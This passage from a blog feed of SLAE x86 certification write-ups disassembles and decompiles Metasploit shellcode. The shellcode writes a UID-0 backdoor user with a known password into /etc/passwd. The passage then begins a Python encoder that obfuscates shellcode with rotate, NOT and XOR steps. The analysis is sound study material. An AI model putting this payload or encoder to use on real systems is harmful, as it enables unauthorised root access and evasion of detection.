&lt;span class=&quot;err&quot;&gt;0000004&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;F&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;das&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000050&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;7368&lt;/span&gt;              &lt;span class=&quot;nf&quot;&gt;jnc&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xba&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000052&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A598B&lt;/span&gt;            &lt;span class=&quot;nv&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x75&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;The bytes from &lt;code&gt;0x0000002B&lt;/code&gt; to &lt;code&gt;0x00000052&lt;/code&gt; represent a string. In fact, the last byte is &lt;code&gt;0x0a&lt;/code&gt; is a newline (&lt;code&gt;\n&lt;/code&gt;) on Linux systems)
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;00000055&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;51&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000056&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;FC&lt;/span&gt;                &lt;span class=&quot;nb&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;d&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000057&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A04&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000059&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;58&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000005&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000005&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;A01&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000005&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000005&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I won't cover the bytes from &lt;code&gt;0x00000052&lt;/code&gt; to &lt;code&gt;0x0000005f&lt;/code&gt; as they aren't correct. In this case, &lt;code&gt;ndisasm&lt;/code&gt; thinks that the byte at &lt;code&gt;0x00000052&lt;/code&gt; is the opcode for the &lt;code&gt;OR&lt;/code&gt; instructions, however it's simply a newline.&lt;/p&gt;
&lt;p&gt;I had to adjust it manually:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'598b51fc6a0458cd806a0158cd80'&lt;/span&gt; | xxd &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shellcode2.bin

ndisasm shellcode2.bin &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 32 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; intel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Follows the output of &lt;code&gt;ndisasm&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; store the reference to the string into ECX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000000&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;59&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; copy the byte stored at ECX-4 into EDX &lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000001&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B51FC&lt;/span&gt;            &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call the write syscall&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000004&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A04&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000006&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;58&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000007&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;According to the docs, EDX stores the length of the string, so it should be &lt;code&gt;0x28&lt;/code&gt; (40 chars). The value is the fourth-to-last byte of the instruction stored at the address &lt;code&gt;0x00000026&lt;/code&gt; (&lt;code&gt;E828000000&lt;/code&gt;)
&lt;/sub&gt;&lt;/p&gt;
&lt;p&gt;Aftert the shellcode retrieves the size of the string to bo written, it uses the &lt;code&gt;write()&lt;/code&gt; syscall to write into the previously opened file, which is overwritten.&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; call the exit syscall&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000009&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A01&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;The shellcode gracefully terminates its execution
&lt;/sub&gt;&lt;/p&gt;
&lt;p&gt;These last two pieces of shellcode simply write the new string inside the previously-opened file: &lt;code&gt;/etc//passwd&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The line is the following:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;6D65746173706C6F69743A417A2F6449736A3470344952633A303A303A3A2F3A2F62696E2F73680A&quot;&lt;/span&gt; | xxd &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The format is the following:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# USERNAME:HASHED_PASSWORD:UID:GUID:GECOS_INFO:HOME_DIRECTORY:SHELL&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The password in encrypted with &lt;code&gt;DES&lt;/code&gt;, which is a weak encryption scheme. The first two characters (&lt;code&gt;Az&lt;/code&gt;) are the salt, while the other eleven characters are the hash value.&lt;/p&gt;
&lt;p&gt;According to the documentation of the module, the password should be &lt;code&gt;metasploit&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Once the line is written, a new user with &lt;code&gt;UID 0&lt;/code&gt; and &lt;code&gt;GUID 0&lt;/code&gt; (hence identical to &lt;code&gt;root&lt;/code&gt;), will be added to the machine.&lt;/p&gt;
&lt;h3 id=&quot;decompiling&quot;&gt;Decompiling&lt;/h3&gt;
&lt;p&gt;Since the shellcode it's small, I tried to convert the assembly instructions into a C program, in order to make it easier to understand what's going on:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;setreuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/etc//passwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_NOCTTY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;A brief summary:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;it uses &lt;code&gt;setreuid()&lt;/code&gt; to set &amp;quot;real and effective user IDs of the calling process&amp;quot; (the differents arises when impersonating other users)&lt;/li&gt;
&lt;li&gt;it uses &lt;code&gt;open()&lt;/code&gt; to open the file &lt;code&gt;/etc//passwd&lt;/code&gt; (which must already exist) in write mode, so it overwrites all of the contents&lt;/li&gt;
&lt;li&gt;it uses &lt;code&gt;write()&lt;/code&gt; to write &lt;strong&gt;40 bytes&lt;/strong&gt; (the string shown above) inside the file&lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Sat, 25 Dec 2021 00:00:00 +0100</pubDate>
        <link>/21/12/25/slae32-assignment-5_1</link>
        <guid isPermaLink="true">/21/12/25/slae32-assignment-5_1</guid>
        
        <category>slae</category>
        
        <category>assembly</category>
        
        <category>nasm</category>
        
        <category>c</category>
        
        <category>x86</category>
        
        <category>exam</category>
        
        <category>shellcode</category>
        
        <category>metasploit</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>SLAE x86 Exam - Assignment #4</title>
        <description>&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.pentesteracademy.com/course?id=3&quot;&gt;https://www.pentesteracademy.com/course?id=3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Student ID: PA-30398&lt;/p&gt;
&lt;h2 id=&quot;foreword&quot;&gt;Foreword&lt;/h2&gt;
&lt;p&gt;The 4th assignment requires you to write a custom encoding scheme. The &lt;code&gt;PoC&lt;/code&gt; ought to encode the &lt;code&gt;execve-stack&lt;/code&gt; shellcode and execute it.&lt;/p&gt;
&lt;h2 id=&quot;source-code&quot;&gt;Source Code&lt;/h2&gt;
&lt;p&gt;For this assignment, I uploaded the following files inside the folder &lt;a href=&quot;https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/4&quot;&gt;assignment/4&lt;/a&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/4/encoder.py&quot;&gt;encoder.py&lt;/a&gt;: Python encoder using ROR/ROL-NOT-XOR instructions&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/4/decoder.nasm&quot;&gt;decoder.nasm&lt;/a&gt;: Assembly decoder for the encoder above&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;encoding-scheme&quot;&gt;Encoding Scheme&lt;/h2&gt;
&lt;p&gt;I tried to think of an encoder that uses just a few mathematical operations and that's not too obvious like XOR encoders.&lt;/p&gt;
&lt;p&gt;My implementation looks like this:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;rotate:
&lt;ol&gt;
&lt;li&gt;even-index bytes &lt;code&gt;ROT_EVEN&lt;/code&gt; times using ROR (Right Rotation)&lt;/li&gt;
&lt;li&gt;odd-index bytes &lt;code&gt;ROT_ODD&lt;/code&gt; times using ROL (Left Rotation)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;invert (&lt;code&gt;NOT&lt;/code&gt;) each byte&lt;/li&gt;
&lt;li&gt;XOR each byte with the least significant byte of the length of the shellcode (&lt;code&gt;SHELL_CODE_LENGTH&lt;/code&gt;, made up of 2 bytes)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The encoded shellcode (with the prepended auxiliary bytes) should look like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/slae32/encoded_shellcode.png&quot; alt=&quot;Visual representation of the encoded shellcode&quot; /&gt;
&lt;em&gt;Visual representation of the encoded shellcode&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;python-encoder&quot;&gt;Python Encoder&lt;/h2&gt;
&lt;p&gt;Follows the python code that reads the shellcode stored inside &lt;code&gt;--input&lt;/code&gt;, encodes it according to the previous scheme, and saves it into &lt;code&gt;--output&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-i&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;--input&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;File containing shellcode to encode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-o&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;--output&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Store the encoded shellcode in this file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;input_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;output_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;manage_shellcode_encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;manage_shellcode_decoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;After the shellcode is encoded, the program &lt;code&gt;asserts&lt;/code&gt; whether the decoded version is correct
&lt;/sub&gt;&lt;/p&gt;
&lt;p&gt;Follows the encoding function:&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encode_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Original non-encoded shellcode (HEX): &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;shellcode_length_most_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ROT_EVEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ROT_ODD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gen_random_rotations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ms_byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_length_most_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ls_byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
